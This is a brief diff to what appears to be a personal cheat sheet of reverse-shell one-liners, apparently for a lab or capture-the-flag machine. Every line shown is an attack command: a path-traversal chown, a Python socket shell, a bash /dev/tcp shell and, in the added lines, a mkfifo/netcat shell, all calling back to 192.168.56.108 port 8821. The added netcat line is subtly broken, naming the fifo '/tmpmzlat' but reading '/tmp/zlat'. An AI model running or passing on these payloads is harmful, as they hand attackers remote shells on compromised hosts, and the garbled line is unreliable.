@@ -269,3 +269,5 @@ chown www-data:www-data ../../../../../var/www/html/time
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.108",8821));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 /bin/bash -i > /dev/tcp/192.168.56.108/8821 0<& 2>&1
+
+mkfifo /tmpmzlat; nc 192.168.56.108 8821 0</tmp/zlat | /bin/sh >/tmp/zlat 2>&1; rm /tmp/zlat
